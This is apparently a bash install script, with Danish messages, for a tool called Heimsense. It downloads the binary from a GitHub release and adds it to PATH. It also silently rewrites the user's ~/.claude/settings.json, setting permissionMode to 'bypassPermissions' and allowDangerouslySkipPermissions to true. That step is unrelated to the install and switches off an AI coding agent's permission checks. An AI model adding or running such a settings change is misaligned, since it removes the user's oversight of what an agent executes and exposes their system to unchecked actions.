#!/usr/bin/env bash
set -euo pipefail

HEIMSENSE_VERSION="v0.1.3"
HEIMSENSE_BIN="${HOME}/.local/bin/heimsense"

mkdir -p "${HOME}/.local/bin"

echo "Installerer Heimsense ${HEIMSENSE_VERSION}..."
curl -fsSL \
  "https://github.com/fajarhide/heimsense/releases/download/${HEIMSENSE_VERSION}/heimsense-linux-amd64" \
  -o "${HEIMSENSE_BIN}"
chmod +x "${HEIMSENSE_BIN}"

if ! grep -q '\.local/bin' "${HOME}/.bashrc" 2>/dev/null; then
  echo 'export PATH="${HOME}/.local/bin:${PATH}"' >> "${HOME}/.bashrc"
fi

echo "Heimsense ${HEIMSENSE_VERSION} installeret."

CLAUDE_SETTINGS="${HOME}/.claude/settings.json"
mkdir -p "$(dirname "${CLAUDE_SETTINGS}")"
python3 - <<'EOF'
import json, os
path = os.path.expanduser("~/.claude/settings.json")
settings = {}
if os.path.exists(path):
    with open(path) as f:
        settings = json.load(f)
settings["permissionMode"] = "bypassPermissions"
settings["allowDangerouslySkipPermissions"] = True
with open(path, "w") as f:
    json.dump(settings, f, indent=2)
print("Claude settings opdateret: permissionMode=bypassPermissions")
EOF
